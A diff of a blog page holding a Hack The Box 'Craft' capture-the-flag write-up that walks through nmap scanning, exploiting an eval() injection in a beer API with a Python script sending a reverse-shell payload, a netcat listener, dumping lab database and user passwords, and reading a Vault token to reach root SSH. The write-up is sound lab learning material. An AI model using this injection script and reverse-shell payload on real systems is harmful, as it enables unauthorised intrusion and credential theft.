@@ -1,226 +1,15 @@
-<!DOCTYPE html>
-<html lang="es">
-    <head>
-        <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="ie=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="author" content="ceso ">
-<meta name="description" content="Quick Summary So!! Today was just retired Craft from Hack the box, this was a really fun box to do, and also I felt pretty well doing it, because even if I needed some nudges, it was actually the first box I got to the foothold without hints (elsen if I needed some guidance with python, thanks a lot @Frundrod!!), and afterward to get user I was a bit lost and also needed some hints (was not realizing something I have literally in my nose, thankss a lot @Fugl!" />
-<meta name="keywords" content="CTF, Security, HTB, Blog, Infosec, linux, htb-medium, rce, python, code-analysis, web, ssh" />
-<meta name="robots" content="noodp" />
-<meta name="theme-color" content="#252627" />
-<link rel="canonical" href="https://ceso.github.io/es/posts/2020/01/hack-the-box-craft/" />
-
-
-    <title>
-        
-            Hack The Box - Craft :: Las Aventuras de Ceso 
-        
-    </title>
-
-
-
-<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
-    type="text/css">
-
-
-
-<link rel="stylesheet" href="https://ceso.github.io/main.min.5dcefbf8102eb536dd3e2de53ffebfa58599ab2435c241a0db81728a5e015f2e.css">
-
-
-    
-        <link rel="stylesheet" type="text/css" href="https://ceso.github.io/css/scroll.css">
-    
-
-
-
-    <link rel="apple-touch-icon" sizes="180x180" href="https://ceso.github.io/apple-touch-icon.png">
-    <link rel="icon" type="image/png" sizes="32x32" href="https://ceso.github.io/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="https://ceso.github.io/favicon-16x16.png">
-    <link rel="manifest" href="https://ceso.github.io/site.webmanifest">
-    <link rel="mask-icon" href="https://ceso.github.io/safari-pinned-tab.svg" color="#252627">
-    <link rel="shortcut icon" href="https://ceso.github.io/favicon.ico">
-    <meta name="msapplication-TileColor" content="#252627">
-    <meta name="theme-color" content="#252627">
-
-
-
-<meta itemprop="name" content="Hack The Box - Craft">
-<meta itemprop="description" content="My write-up / walkthrough for Craft from Hack The Box.">
-<meta itemprop="datePublished" content="2020-01-04T00:00:00&#43;00:00" />
-<meta itemprop="dateModified" content="2020-01-04T00:00:00&#43;00:00" />
-<meta itemprop="wordCount" content="2646">
-<meta itemprop="image" content="https://ceso.github.io/images/htb/craft/craft-header.jpg">
-
-
-
-<meta itemprop="keywords" content="linux,htb-medium,rce,python,code-analysis,web,ssh," />
-<meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://ceso.github.io/images/htb/craft/craft-header.jpg"/>
-
-<meta name="twitter:title" content="Hack The Box - Craft"/>
-<meta name="twitter:description" content="My write-up / walkthrough for Craft from Hack The Box."/>
-
-
-
-
-
-
-
-    <meta property="article:published_time" content="2020-01-04 00:00:00 &#43;0000 UTC" />
-
-
-
-
-
-
-
-
-    </head>
-
-    <body class="dark-theme">
-        <div class="container">
-            <header class="header">
-    <span class="header__inner">
-        <a href="https://ceso.github.io/" style="text-decoration: none;">
-    <div class="logo">
-        
-            <span class="logo__mark">></span>
-            <span class="logo__text">ceso@hogsmeade$ </span>
-            <span class="logo__cursor" style=
-                  "
-                   background-color:#808080;
-                   ">
-            </span>
-        
-    </div>
-</a>
-
-
-        <span class="header__right">
-            
-                <nav class="menu">
-    <ul class="menu__inner"><li><a href="https://ceso.github.io/es/about/">About</a></li><li><a href="https://ceso.github.io/es/posts/2020/04/hacking/oscp-cheatsheet/">Cheatsheet</a></li><li><a href="https://ceso.github.io/es/posts/">Posts</a></li><li><a href="https://ceso.github.io/es/posts/2020/12/hacking-resources/">Resources</a></li><li><a href="https://ceso.github.io/es/tags/">Tags</a></li>
-    </ul>
-</nav>
-
-                <span class="menu-trigger">
-                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-                        <path d="M0 0h24v24H0z" fill="none"/>
-                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
-                    </svg>
-                </span>
-            
-
-            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
-  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
-  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
-  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
-</svg>
-</span>
-        </span>
-    </span>
-</header>
-
-
-            <div class="content">
-                
-  
-  
-
-  <div class="post">
-
-    <div class="post-info">
-      <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>13 minutos
-
-        
-          | Also available in
-          
-            <a href="https://ceso.github.io/posts/2020/01/hack-the-box-craft/"><span class="flag flag-icon flag-icon-us flag-icon-squared"></span></a>
-          
-        
-
-      </p>
-    </div>
-
-    <h2 class="post-title"><a href="https://ceso.github.io/es/posts/2020/01/hack-the-box-craft/">Hack The Box - Craft</a></h2>
-    <div class="post-meta">
-      
-        <span class="post-date">
-          2020-01-04
-        </span>
-
-        
-          
-        
-      
-
-      
-      
-    </div>
-
-    
-      <span class="post-tags">
-        
-          #<a href="https://ceso.github.io/tags/linux/">linux</a>&nbsp;
-        
-          #<a href="https://ceso.github.io/tags/htb-medium/">htb-medium</a>&nbsp;
-        
-          #<a href="https://ceso.github.io/tags/rce/">rce</a>&nbsp;
-        
-          #<a href="https://ceso.github.io/tags/python/">python</a>&nbsp;
-        
-          #<a href="https://ceso.github.io/tags/code-analysis/">code-analysis</a>&nbsp;
-        
-          #<a href="https://ceso.github.io/tags/web/">web</a>&nbsp;
-        
-          #<a href="https://ceso.github.io/tags/ssh/">ssh</a>&nbsp;
-        
-      </span>
-    
-
-    
-
-    <div class="post-content"><div id="TableOfContents">
-<ul>
-    
-
-    
-    <li>
-      <a href="#quick-summary">Quick Summary</a>
-    
-
-    
-    </li><li>
-          <a href="#nmap">Nmap</a>
-    
-
-    
-    </li><li>
-          <a href="#web-enumeration">Web enumeration</a>
-    
-
-    
-    </li><li>
-          <a href="#rce">RCE</a>
-    
-
-    
-    </li><li>
-          <a href="#root">root</a>
-  </li></ul>
-</div>
-    <img src="https://ceso.github.io/images/htb/craft/info-card.png"  class="center"  style="border-radius: 8px;"  />
-
-
-<h2 id="quick-summary">Quick Summary</h2>
-<p>So!!
-Today was just retired Craft from Hack the box, this was a really fun box to do, and also I felt pretty well doing it, because even if I needed some nudges, it was actually the first box I got to the foothold without hints (elsen if I needed some guidance with python, thanks a lot @Frundrod!!), and afterward to get user I was a bit lost and also needed some hints (was not realizing something I have literally in my nose, thankss a lot <a href="https://www.hackthebox.eu/profile/103596">@Fugl!</a>), root was easy by a little bit of enumeration and reading help command output.</p>
-<p>I had so much fun with this box trying to break in before it was going to be retired, that challenge of doing it with a few hours of deadline felt so god!</p>
-<p>Said that, let&rsquo;s start with the real write up!</p>
-<h2 id="nmap">Nmap</h2>
-<p>We start running nmap to scan for open ports and services:</p>
-<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# nmap -sC -sV -O 10.10.10.110 -o ininitial-nmap.htb
+<!doctype html><html lang=es><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content="ceso"><meta name=description content="Quick Summary So!! Today was just retired Craft from Hack the box, this was a really fun box to do, and also I felt pretty well doing it, because even if I needed some nudges, it was actually the first box I got to the foothold without hints (elsen if I needed some guidance with python, thanks a lot @Frundrod!!), and afterward to get user I was a bit lost and also needed some hints (was not realizing something I have literally in my nose, thankss a lot @Fugl!"><meta name=keywords content="CTF,Security,HTB,Blog,Infosec,linux,htb-medium,rce,python,code-analysis,web,ssh"><meta name=robots content="noodp"><meta name=theme-color content="#252627"><link rel=canonical href=https://ceso.github.io/es/posts/2020/01/hack-the-box-craft/><title>Hack The Box - Craft :: Las Aventuras de Ceso</title><link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css rel=stylesheet type=text/css><link rel=stylesheet href=https://ceso.github.io/main.min.5dcefbf8102eb536dd3e2de53ffebfa58599ab2435c241a0db81728a5e015f2e.css><link rel=stylesheet type=text/css href=https://ceso.github.io/css/scroll.css><link rel=apple-touch-icon sizes=180x180 href=https://ceso.github.io/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=https://ceso.github.io/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=https://ceso.github.io/favicon-16x16.png><link rel=manifest href=https://ceso.github.io/site.webmanifest><link rel=mask-icon href=https://ceso.github.io/safari-pinned-tab.svg color=#252627><link rel="shortcut icon" href=https://ceso.github.io/favicon.ico><meta name=msapplication-TileColor content="#252627"><meta name=theme-color content="#252627"><meta itemprop=name content="Hack The Box - Craft"><meta itemprop=description content="My write-up / walkthrough for Craft from Hack The Box."><meta itemprop=datePublished content="2020-01-04T00:00:00+00:00"><meta itemprop=dateModified content="2020-01-04T00:00:00+00:00"><meta itemprop=wordCount content="2646"><meta itemprop=image content="https://ceso.github.io/images/htb/craft/craft-header.jpg"><meta itemprop=keywords content="linux,htb-medium,rce,python,code-analysis,web,ssh,"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://ceso.github.io/images/htb/craft/craft-header.jpg"><meta name=twitter:title content="Hack The Box - Craft"><meta name=twitter:description content="My write-up / walkthrough for Craft from Hack The Box."><meta property="article:published_time" content="2020-01-04 00:00:00 +0000 UTC"></head><body class=dark-theme><div class=container><header class=header><span class=header__inner><a href=https://ceso.github.io/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
+<span class=logo__text>ceso@hogsmeade$</span>
+<span class=logo__cursor style=background-color:gray></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=https://ceso.github.io/es/about/>About</a></li><li><a href=https://ceso.github.io/es/posts/2020/04/hacking/oscp-cheatsheet/>Cheatsheet</a></li><li><a href=https://ceso.github.io/es/posts/>Posts</a></li><li><a href=https://ceso.github.io/es/posts/2020/12/hacking-resources/>Resources</a></li><li><a href=https://ceso.github.io/es/tags/>Tags</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41C32.4934 41 41 32.4934 41 22 41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><div class=post><div class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>13 minutos
+| Also available in
+<a href=https://ceso.github.io/posts/2020/01/hack-the-box-craft/><span class="flag flag-icon flag-icon-us flag-icon-squared"></span></a></p></div><h2 class=post-title><a href=https://ceso.github.io/es/posts/2020/01/hack-the-box-craft/>Hack The Box - Craft</a></h2><div class=post-meta><span class=post-date>2020-01-04</span></div><span class=post-tags>#<a href=https://ceso.github.io/tags/linux/>linux</a>&nbsp;
+#<a href=https://ceso.github.io/tags/htb-medium/>htb-medium</a>&nbsp;
+#<a href=https://ceso.github.io/tags/rce/>rce</a>&nbsp;
+#<a href=https://ceso.github.io/tags/python/>python</a>&nbsp;
+#<a href=https://ceso.github.io/tags/code-analysis/>code-analysis</a>&nbsp;
+#<a href=https://ceso.github.io/tags/web/>web</a>&nbsp;
+#<a href=https://ceso.github.io/tags/ssh/>ssh</a>&nbsp;</span><div class=post-content><div id=TableOfContents><ul><li><a href=#quick-summary>Quick Summary</a></li><li><a href=#nmap>Nmap</a></li><li><a href=#web-enumeration>Web enumeration</a></li><li><a href=#rce>RCE</a></li><li><a href=#root>root</a></li></ul></div><img src=https://ceso.github.io/images/htb/craft/info-card.png class=center style=border-radius:8px><h2 id=quick-summary>Quick Summary</h2><p>So!!
+Today was just retired Craft from Hack the box, this was a really fun box to do, and also I felt pretty well doing it, because even if I needed some nudges, it was actually the first box I got to the foothold without hints (elsen if I needed some guidance with python, thanks a lot @Frundrod!!), and afterward to get user I was a bit lost and also needed some hints (was not realizing something I have literally in my nose, thankss a lot <a href=https://www.hackthebox.eu/profile/103596>@Fugl!</a>), root was easy by a little bit of enumeration and reading help command output.</p><p>I had so much fun with this box trying to break in before it was going to be retired, that challenge of doing it with a few hours of deadline felt so god!</p><p>Said that, let&rsquo;s start with the real write up!</p><h2 id=nmap>Nmap</h2><p>We start running nmap to scan for open ports and services:</p><pre><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/craft# nmap -sC -sV -O 10.10.10.110 -o ininitial-nmap.htb
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-23 17:21 EST
 Nmap scan report for 10.10.10.110
 Host is up (0.082s latency).
@@ -260,68 +49,13 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 32.11 seconds
-</code></pre><p>We got port port 22 (SSH) and 443 (HTTPS) are open.</p>
-<h2 id="web-enumeration">Web enumeration</h2>
-<p>The home page is kind-empty, but if we position the cursor on API and the Github logo, we see at the bottom that it will redirect to <code>https://api.craft.htb</code> and <code>https://gogs.craft.htb</code>, we will add them to <code>/etc/hosts</code> pointing to the IP of craft <code>10.10.10.110</code>.</p>
-<p>
-    <img src="https://ceso.github.io/images/htb/craft/1-web-enum.png"  class="center"  style="border-radius: 8px;"  />
-
-
-
-    <img src="https://ceso.github.io/images/htb/craft/2-web-enum.png"  class="center"  style="border-radius: 8px;"  />
-
-</p>
-<p>Afterwards, we jump into <code>https://api.craft.htb</code> and we can see the endpoints and how to interact with them.</p>
-
-    <img src="https://ceso.github.io/images/htb/craft/1-api.png"  class="center"  style="border-radius: 8px;"  />
-
-
-
-    <img src="https://ceso.github.io/images/htb/craft/2-api.png"  class="center"  style="border-radius: 8px;"  />
-
-
-
-    <img src="https://ceso.github.io/images/htb/craft/3-api.png"  class="center"  style="border-radius: 8px;"  />
-
-
-<p>We don&rsquo;t have at the moment any credentials to identify, so we go to <code>https://gogs.craft.htb</code> in order to see if we can find something.</p>
-
-    <img src="https://ceso.github.io/images/htb/craft/1-gogs.png"  class="center"  style="border-radius: 8px;"  />
-
-
-
-    <img src="https://ceso.github.io/images/htb/craft/2-gogs.png"  class="center"  style="border-radius: 8px;"  />
-
-
-
-    <img src="https://ceso.github.io/images/htb/craft/3-gogs.png"  class="center"  style="border-radius: 8px;"  />
-
-
-<p>We see in explore there is a repository named <code>craft-api</code> and that the users is our gang from Silicon Valley.</p>
-<p>We jump into the repository, and start looking if we can find something.</p>
-
-    <img src="https://ceso.github.io/images/htb/craft/4-gogs.png"  class="center"  style="border-radius: 8px;"  />
-
-
-<p>There is an issue open, so we go inside it, and there is a &ldquo;fix&rdquo;, one that Gilfoyle is not happy about it.</p>
-
-    <img src="https://ceso.github.io/images/htb/craft/5-gogs.png"  class="center"  style="border-radius: 8px;"  />
-
-
-<p>So, there is the use of an <code>eval()</code>, that&rsquo;s something we could use to inject a command.</p>
-
-    <img src="https://ceso.github.io/images/htb/craft/6-gogs.png"  class="center"  style="border-radius: 8px;"  />
-
-
-<p>Taking a look into the commits made by Denish, we found in the commit <code>a2d28ed155</code> that he removed hardcoded credentials, exactly the kind of things we needed:</p>
-
-    <img src="https://ceso.github.io/images/htb/craft/7-gogs.png"  class="center"  style="border-radius: 8px;"  />
-
-
-<h2 id="rce">RCE</h2>
-<p>Now with credentials, knowing we could take advantage of the <code>eval()</code> and remembering the curl Denish was using in his issue + the API, we can make an injection via a POST to <code>/api/brew/</code>.
-I wrote a small script to authenticate and post that does the injection (tbh, I missed I could just use <code>test.py</code> realized about it late). grabbing the token and using it to authenticate.</p>
-<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# cat craft_inject.py 
+</code></pre><p>We got port port 22 (SSH) and 443 (HTTPS) are open.</p><h2 id=web-enumeration>Web enumeration</h2><p>The home page is kind-empty, but if we position the cursor on API and the Github logo, we see at the bottom that it will redirect to <code>https://api.craft.htb</code> and <code>https://gogs.craft.htb</code>, we will add them to <code>/etc/hosts</code> pointing to the IP of craft <code>10.10.10.110</code>.</p><p><img src=https://ceso.github.io/images/htb/craft/1-web-enum.png class=center style=border-radius:8px>
+<img src=https://ceso.github.io/images/htb/craft/2-web-enum.png class=center style=border-radius:8px></p><p>Afterwards, we jump into <code>https://api.craft.htb</code> and we can see the endpoints and how to interact with them.</p><img src=https://ceso.github.io/images/htb/craft/1-api.png class=center style=border-radius:8px>
+<img src=https://ceso.github.io/images/htb/craft/2-api.png class=center style=border-radius:8px>
+<img src=https://ceso.github.io/images/htb/craft/3-api.png class=center style=border-radius:8px><p>We don&rsquo;t have at the moment any credentials to identify, so we go to <code>https://gogs.craft.htb</code> in order to see if we can find something.</p><img src=https://ceso.github.io/images/htb/craft/1-gogs.png class=center style=border-radius:8px>
+<img src=https://ceso.github.io/images/htb/craft/2-gogs.png class=center style=border-radius:8px>
+<img src=https://ceso.github.io/images/htb/craft/3-gogs.png class=center style=border-radius:8px><p>We see in explore there is a repository named <code>craft-api</code> and that the users is our gang from Silicon Valley.</p><p>We jump into the repository, and start looking if we can find something.</p><img src=https://ceso.github.io/images/htb/craft/4-gogs.png class=center style=border-radius:8px><p>There is an issue open, so we go inside it, and there is a &ldquo;fix&rdquo;, one that Gilfoyle is not happy about it.</p><img src=https://ceso.github.io/images/htb/craft/5-gogs.png class=center style=border-radius:8px><p>So, there is the use of an <code>eval()</code>, that&rsquo;s something we could use to inject a command.</p><img src=https://ceso.github.io/images/htb/craft/6-gogs.png class=center style=border-radius:8px><p>Taking a look into the commits made by Denish, we found in the commit <code>a2d28ed155</code> that he removed hardcoded credentials, exactly the kind of things we needed:</p><img src=https://ceso.github.io/images/htb/craft/7-gogs.png class=center style=border-radius:8px><h2 id=rce>RCE</h2><p>Now with credentials, knowing we could take advantage of the <code>eval()</code> and remembering the curl Denish was using in his issue + the API, we can make an injection via a POST to <code>/api/brew/</code>.
+I wrote a small script to authenticate and post that does the injection (tbh, I missed I could just use <code>test.py</code> realized about it late). grabbing the token and using it to authenticate.</p><pre><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/craft# cat craft_inject.py 
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 import requests
@@ -339,9 +73,8 @@ inject = &quot;&quot;&quot;__import__(&quot;os&quot;).system(&quot;rm /tmp/f;mkf
 payload = {&quot;name&quot;:&quot;foo&quot;,&quot;brewer&quot;:&quot;foo&quot;, &quot;style&quot;:&quot;foo&quot;, &quot;abv&quot;:inject}
 payload = json.dumps(payload)
 attack = requests.post(url, verify=False, headers=headers, allow_redirects=False, data=payload)
-</code></pre><p>In one tab run nc listening on port 4444 with <code>nc -lvp 4444</code>, and run in other tab we run the script to get the reverse:</p>
-<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# ./craft_inject.py 
-</code></pre><pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# nc -lvp 4444
+</code></pre><p>In one tab run nc listening on port 4444 with <code>nc -lvp 4444</code>, and run in other tab we run the script to get the reverse:</p><pre><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/craft# ./craft_inject.py 
+</code></pre><pre><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/craft# nc -lvp 4444
 listening on [any] 4444 ...
 connect to [10.10.14.16] from api.craft.htb [10.10.10.110] 41887
 /bin/sh: can't access tty; job control turned off
@@ -349,16 +82,14 @@ connect to [10.10.14.16] from api.craft.htb [10.10.10.110] 41887
 root
 /opt/app # id
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
-</code></pre><p>There is something weird, we are already root? we check if there is the <code>root.txt</code> in it&rsquo;s home and not, is not:</p>
-<pre><code class="language-console" data-lang="console">/opt/app # cd /root
+</code></pre><p>There is something weird, we are already root? we check if there is the <code>root.txt</code> in it&rsquo;s home and not, is not:</p><pre><code class=language-console data-lang=console>/opt/app # cd /root
 /root # ls -la
 total 12
 drwx------    1 root     root          4096 Feb  9  2019 .
 drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..
 drwx------    1 root     root          4096 Feb  9  2019 .cache
 /root # 
-</code></pre><p>So we start enumerating and realize we are inside a jail (specifically a docker container, busybox):</p>
-<pre><code class="language-console" data-lang="console">/opt/app # ls -la /
+</code></pre><p>So we start enumerating and realize we are inside a jail (specifically a docker container, busybox):</p><pre><code class=language-console data-lang=console>/opt/app # ls -la /
 total 64
 drwxr-xr-x    1 root     root          4096 Feb 10  2019 .
 drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..
@@ -413,8 +144,7 @@ lrwxrwxrwx    1 root     root            12 Jan 30  2019 cpio -&gt; /bin/busybox
 -rwxr-xr-x    1 root     root        898192 Jan  3  2019 cpp
 lrwxrwxrwx    1 root     root            12 Jan 30  2019 crontab -&gt; /bin/busybox
 lrwxrwxrwx    1 root     root            12 Jan 30  2019 cryptpw -&gt; /bin/busybox
-</code></pre><p>Inside the directory were we started <code>/opt/app</code> we see if there is something interesting:</p>
-<pre><code class="language-console" data-lang="console">/opt/app # ls -la
+</code></pre><p>Inside the directory were we started <code>/opt/app</code> we see if there is something interesting:</p><pre><code class=language-console data-lang=console>/opt/app # ls -la
 total 32
 drwxr-xr-x    5 root     root          4096 Feb 10  2019 .
 drwxr-xr-x    1 root     root          4096 Feb  9  2019 ..
@@ -435,8 +165,7 @@ craft_api/database/models.py:        self.password = password
 craft_api/settings.py:MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
 dbtest.py:                             password=settings.MYSQL_DATABASE_PASSWORD,
 /opt/app # 
-</code></pre><p>There we see we have credentials for the database, we took a deep look into <code>craft_api/settings.py</code> to see which one is the user, and it&rsquo;s <code>craft</code>, we take a look into the <code>dbtest.py</code> we found early under <code>/opt/app</code>:</p>
-<pre><code class="language-console" data-lang="console">/opt/app # cat dbtest.py
+</code></pre><p>There we see we have credentials for the database, we took a deep look into <code>craft_api/settings.py</code> to see which one is the user, and it&rsquo;s <code>craft</code>, we take a look into the <code>dbtest.py</code> we found early under <code>/opt/app</code>:</p><pre><code class=language-console data-lang=console>/opt/app # cat dbtest.py
 #!/usr/bin/env python
 
 import pymysql
@@ -461,36 +190,17 @@ finally:
     connection.close()
 /opt/app #
 </code></pre><p>It&rsquo;s using pymsql to interact with the database, going to the documentation of it, we see that what we need is to use the <code>method fetchall()</code>
-
-    <img src="https://ceso.github.io/images/htb/craft/1-rce.png"  class="center"  style="border-radius: 8px;"  />
-
-
-So, I change the script to do a <code>show tables</code> using <code>fetchall()</code> instead of <code>fetchone()</code>:</p>
-<pre><code class="language-console" data-lang="console">/opt/app # sed -i 's/result \= cursor.fetchone()/sql \= \&quot;show tables\&quot;/' dbtest.py
+<img src=https://ceso.github.io/images/htb/craft/1-rce.png class=center style=border-radius:8px>
+So, I change the script to do a <code>show tables</code> using <code>fetchall()</code> instead of <code>fetchone()</code>:</p><pre><code class=language-console data-lang=console>/opt/app # sed -i 's/result \= cursor.fetchone()/sql \= \&quot;show tables\&quot;/' dbtest.py
 /opt/app # sed -i 's/result \= cursor.fetchone()/result \= cursor.fetchall()/' dbtest.py
-</code></pre><p>And post that, we ran the script, and we get 2 tables one that looks interesting named <code>user</code>, we modify again the sql query but to select all the records from that table:</p>
-<pre><code class="language-console" data-lang="console">/opt/app # python dbtest.py
+</code></pre><p>And post that, we ran the script, and we get 2 tables one that looks interesting named <code>user</code>, we modify again the sql query but to select all the records from that table:</p><pre><code class=language-console data-lang=console>/opt/app # python dbtest.py
 [{'Tables_in_craft': 'brew'}, {'Tables_in_craft': 'user'}]
 /opt/app # sed -i 's/sql \= \&quot;show tables\&quot;/sql \= \&quot;SELECT * FROM user\&quot;/' dbtest.py
 /opt/app # python dbtest.py
 [{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
 /opt/app # 
-</code></pre><p>So, we got the users <code>dinesh, ebachman and gilfoyle</code> and it&rsquo;s respective passwords, with that we go to <code>https://gogs.craft.htb</code> again and login as <code>gilfoyle</code> and we found that he has a private repo to deploy the infra called <code>craft-infra</code></p>
-
-    <img src="https://ceso.github.io/images/htb/craft/1-gil.png"  class="center"  style="border-radius: 8px;"  />
-
-
-
-    <img src="https://ceso.github.io/images/htb/craft/2-gil.png"  class="center"  style="border-radius: 8px;"  />
-
-
-<p>We notice there exists a <code>.ssh</code> folder, we look into it and we get a pair of public/private ssh keys:</p>
-
-    <img src="https://ceso.github.io/images/htb/craft/3-gil.png"  class="center"  style="border-radius: 8px;"  />
-
-
-<p>We try to login via ssh as <code>gilfoyle</code> re-using the password we got earlier and we found a success (actually the first tries it failed for me, and spent some hours trying to break the id_rsa with john without success, so give a new try with trying the founded passwords):</p>
-<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# ssh gilfoyle@10.10.10.110 -i id_rsa
+</code></pre><p>So, we got the users <code>dinesh, ebachman and gilfoyle</code> and it&rsquo;s respective passwords, with that we go to <code>https://gogs.craft.htb</code> again and login as <code>gilfoyle</code> and we found that he has a private repo to deploy the infra called <code>craft-infra</code></p><img src=https://ceso.github.io/images/htb/craft/1-gil.png class=center style=border-radius:8px>
+<img src=https://ceso.github.io/images/htb/craft/2-gil.png class=center style=border-radius:8px><p>We notice there exists a <code>.ssh</code> folder, we look into it and we get a pair of public/private ssh keys:</p><img src=https://ceso.github.io/images/htb/craft/3-gil.png class=center style=border-radius:8px><p>We try to login via ssh as <code>gilfoyle</code> re-using the password we got earlier and we found a success (actually the first tries it failed for me, and spent some hours trying to break the id_rsa with john without success, so give a new try with trying the founded passwords):</p><pre><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/craft# ssh gilfoyle@10.10.10.110 -i id_rsa
 
 
   .   *   ..  . *  *
@@ -523,9 +233,7 @@ gilfoyle@craft:~$ id
 uid=1001(gilfoyle) gid=1001(gilfoyle) groups=1001(gilfoyle)
 gilfoyle@craft:~$ wc -c user.txt 
 33 user.txt
-</code></pre><h2 id="root">root</h2>
-<p>We start enumerating to see if we can find anything interesting in the home of gilfoyle, and we found a <code>.vault-token</code> file (vault is a tool for securely access/store secrets as tokens, passowrds, certificates, etc, to learn more about it go to <a href="https://www.vaultproject.io/">Vault project page</a>), and try to login to vault with it which goes well.</p>
-<pre><code class="language-console" data-lang="console">gilfoyle@craft:~$ cat .vault-token 
+</code></pre><h2 id=root>root</h2><p>We start enumerating to see if we can find anything interesting in the home of gilfoyle, and we found a <code>.vault-token</code> file (vault is a tool for securely access/store secrets as tokens, passowrds, certificates, etc, to learn more about it go to <a href=https://www.vaultproject.io/>Vault project page</a>), and try to login to vault with it which goes well.</p><pre><code class=language-console data-lang=console>gilfoyle@craft:~$ cat .vault-token 
 f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9gilfoyle@craft:~$ vault login
 Token (will be hidden): 
 Success! You are now authenticated. The token information displayed below
@@ -543,12 +251,8 @@ identity_policies    []
 policies             [&quot;root&quot;]
 gilfoyle@craft:~$ 
 </code></pre><p>We go back to the repo of <code>craft-infra</code> inside the <code>vault</code> folder to see if we can find the secret stored, in it is a small script <code>secrets.sh</code> which has exactly what we need:
-
-    <img src="https://ceso.github.io/images/htb/craft/4-gil.png"  class="center"  style="border-radius: 8px;"  />
-
-
-with this information we run vault to get the kv if the secret is indeed there:</p>
-<pre><code class="language-console" data-lang="console">gilfoyle@craft:~$ vault kv get ssh/roles/root_otp
+<img src=https://ceso.github.io/images/htb/craft/4-gil.png class=center style=border-radius:8px>
+with this information we run vault to get the kv if the secret is indeed there:</p><pre><code class=language-console data-lang=console>gilfoyle@craft:~$ vault kv get ssh/roles/root_otp
 ========== Data ==========
 Key                  Value
 ---                  -----
@@ -558,9 +262,8 @@ default_user         root
 exclude_cidr_list    n/a
 key_type             otp
 port                 22
-</code></pre><p>We know it is a ssh secret for root (that means, we can use it to establish a connection against root over ssh) with an otp key (<a href="https://en.wikipedia.org/wiki/One-time_password">One-Time Password</a>)
-We check what options vault provides to use it:</p>
-<pre><code class="language-console" data-lang="console">gilfoyle@craft:~$ vault
+</code></pre><p>We know it is a ssh secret for root (that means, we can use it to establish a connection against root over ssh) with an otp key (<a href=https://en.wikipedia.org/wiki/One-time_password>One-Time Password</a>)
+We check what options vault provides to use it:</p><pre><code class=language-console data-lang=console>gilfoyle@craft:~$ vault
 Usage: vault &lt;command&gt; [args]
 
